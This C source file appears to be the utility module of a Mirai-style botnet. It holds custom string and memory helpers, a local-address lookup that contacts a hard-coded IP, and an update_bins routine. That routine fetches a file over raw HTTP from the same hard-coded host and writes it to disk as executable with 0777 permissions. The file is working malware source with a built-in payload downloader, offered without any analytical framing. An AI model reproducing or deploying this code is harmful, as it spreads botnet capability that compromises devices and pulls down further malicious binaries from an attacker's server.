#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>
#include <limits.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>

#include "includes.h"
#include "util.h"
#include "table.h"

BOOL mem_exists(char *buf, int buf_len, char *str, int str_len) {
    int matches = 0;

    if (str_len > buf_len)
        return FALSE;

    while (buf_len--) {
        if (*buf++ == str[matches]) {
            if (++matches == str_len)
                return TRUE;
        }
        else
            matches = 0;
    }

    return FALSE;
}

int util_strlen(char *str)
{
    int c = 0;

    while (*str++ != 0)
        c++;
    return c;
}


BOOL util_strncmp(char *str1, char *str2, int len)
{
    int l1 = util_strlen(str1), l2 = util_strlen(str2);

    if (l1 < len || l2 < len)
        return FALSE;

    while (len--)
    {
        if (*str1++ != *str2++)
            return FALSE;
    }

    return TRUE;
}

BOOL util_strcmp(char *str1, char *str2)
{
    int l1 = util_strlen(str1), l2 = util_strlen(str2);

    if (l1 != l2)
        return FALSE;

    while (l1--)
    {
        if (*str1++ != *str2++)
            return FALSE;
    }

    return TRUE;
}

void util_strcat(char *dst, char *src) {
    while (*dst)
        dst++;

    while (*src)
        *dst++ = *src++;
}

int util_strcpy(char *dst, char *src)
{
    int l = util_strlen(src);

    util_memcpy(dst, src, l + 1);

    return l;
}

void util_memcpy(void *dst, void *src, int len)
{
    char *r_dst = (char *)dst;
    char *r_src = (char *)src;
    while (len--)
        *r_dst++ = *r_src++;
}

void util_zero(void *buf, int len)
{
    char *zero = buf;
    while (len--)
        *zero++ = 0;
}

int util_atoi(char *str, int base)
{
    unsigned long acc = 0;
    int c;
    unsigned long cutoff;
    int neg = 0, any, cutlim;

    do {
        c = *str++;
    } while (util_isspace(c));
    if (c == '-') {
        neg = 1;
        c = *str++;
    } else if (c == '+')
        c = *str++;

    cutoff = neg ? -(unsigned long)LONG_MIN : LONG_MAX;
    cutlim = cutoff % (unsigned long)base;
    cutoff /= (unsigned long)base;
    for (acc = 0, any = 0;; c = *str++) {
        if (util_isdigit(c))
            c -= '0';
        else if (util_isalpha(c))
            c -= util_isupper(c) ? 'A' - 10 : 'a' - 10;
        else
            break;
            
        if (c >= base)
            break;

        if (any < 0 || acc > cutoff || acc == cutoff && c > cutlim)
            any = -1;
        else {
            any = 1;
            acc *= base;
            acc += c;
        }
    }
    if (any < 0) {
        acc = neg ? LONG_MIN : LONG_MAX;
    } else if (neg)
        acc = -acc;
    return (acc);
}

char *util_itoa(int value, int radix, char *string)
{
    if (string == NULL)
        return NULL;

    if (value != 0)
    {
        char scratch[34];
        int neg;
        int offset;
        int c;
        unsigned int accum;

        offset = 32;
        scratch[33] = 0;

        if (radix == 10 && value < 0)
        {
            neg = 1;
            accum = -value;
        }
        else
        {
            neg = 0;
            accum = (unsigned int)value;
        }

        while (accum)
        {
            c = accum % radix;
            if (c < 10)
                c += '0';
            else
                c += 'A' - 10;

            scratch[offset] = c;
            accum /= radix;
            offset--;
        }
        
        if (neg)
            scratch[offset] = '-';
        else
            offset++;

        util_strcpy(string, &scratch[offset]);
    }
    else
    {
        string[0] = '0';
        string[1] = 0;
    }

    return string;
}

int util_memsearch(char *buf, int buf_len, char *mem, int mem_len)
{
    int i, matched = 0;

    if (mem_len > buf_len)
        return -1;

    for (i = 0; i < buf_len; i++)
    {
        if (buf[i] == mem[matched])
        {
            if (++matched == mem_len)
                return i + 1;
        }
        else
            matched = 0;
    }

    return -1;
}

int util_stristr(char *haystack, int haystack_len, char *str)
{
    char *ptr = haystack;
    int str_len = util_strlen(str);
    int match_count = 0;

    while (haystack_len-- > 0)
    {
        char a = *ptr++;
        char b = str[match_count];
        a = a >= 'A' && a <= 'Z' ? a | 0x60 : a;
        b = b >= 'A' && b <= 'Z' ? b | 0x60 : b;

        if (a == b)
        {
            if (++match_count == str_len)
                return (ptr - haystack);
        }
        else
            match_count = 0;
    }

    return -1;
}

ipv4_t util_local_addr(void)
{
    int fd;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof (addr);

    errno = 0;
    if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[util] Failed to call socket(), errno = %d\n", errno);
#endif
        return 0;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(23,224,131,230);
    addr.sin_port = htons(53);

    connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));

    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);
    return addr.sin_addr.s_addr;
}

char *util_fdgets(char *buffer, int buffer_size, int fd)
{
    int got = 0, total = 0;
    do 
    {
        got = read(fd, buffer + total, 1);
        total = got == 1 ? total + 1 : total;
    }
    while (got == 1 && total < buffer_size && *(buffer + (total - 1)) != '\n');

    return total == 0 ? NULL : buffer;
}

int util_isupper(char c)
{
    return (c >= 'A' && c <= 'Z');
}

int util_isalpha(char c)
{
    return ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'));
}

int util_isspace(char c)
{
    return (c == ' ' || c == '\t' || c == '\n' || c == '\12');
}

int util_isdigit(char c)
{
    return (c >= '0' && c <= '9');
}

void update_bins(char *arg0, char *arg1)
{

    #ifdef DEBUG
    printf("UPDATE!\n");
    #endif
   

    //char *id_buf = "dbg";
     int socket_desc;
    unsigned int header_parser = 0;
    char message[30];
    char final[100];
    char final2[100];
    char server_reply[128];
    char *filename = arg0;
    int total_len = 0;
    int status = 0;
    char req[64];
    sprintf(req, "GET /%s HTTP/1.0\r\nUser-Agent: Update v1.0\r\n\r\n", arg0);

    int len; 

    int file_desc;
    remove(arg0);

    struct sockaddr_in server;

    //Create socket
    socket_desc = socket(AF_INET , SOCK_STREAM , 0);
    if (socket_desc == -1)
    {
        //printf("Could not create socket");
    }

    server.sin_addr.s_addr = INET_ADDR(23,224,131,230);
    server.sin_family = AF_INET;
    server.sin_port = htons(80);

    //Connect to remote server
    if (connect(socket_desc , (struct sockaddr *)&server , sizeof(server)) < 0)
    {
        //puts("connect error");
        return;
    }

    #ifdef DEBUG
    printf("connected\n");
    #endif

    //Send request
    //message = "GET /dbg HTTP/1.0\r\n\r\n";

     file_desc = open(filename, O_WRONLY | O_CREAT | O_TRUNC, 0777);

    if (file_desc == -1)
    {
        #ifdef DEBUG
        printf("open() err\n");
        #endif
        close(socket_desc);
    }
    

    if( write(socket_desc , req , util_strlen(req)) != util_strlen(req))
    {
        //printf("write failed");
        close(socket_desc);
        close(file_desc);
        return;
    }

    #ifdef DEBUG
    printf("Data Send\n"); 
    #endif

    while (header_parser != 0x0d0a0d0a)
    {
        char ch;
        int ret = read(socket_desc, &ch, 1);

        if (ret != 1)
        {
            close(socket_desc);
            close(file_desc);
            return;
        }

        header_parser = (header_parser << 8) | ch;
    }


    #ifdef DEBUG
    printf("finished recv http header\n");
    #endif



    while(1)
    {
        int received_len = read(socket_desc, server_reply, sizeof (server_reply));

        total_len += received_len;

        if (received_len <= 0)
            break;

        write(file_desc, server_reply, received_len);
        #ifdef DEBUG
        printf("\nReceived byte size = %d\nTotal lenght = %d", received_len, total_len);
        #endif

    }

    #ifdef DEBUG
    printf("fin.\n");
    #endif

    close(file_desc);
    close(socket_desc);
    return;

}
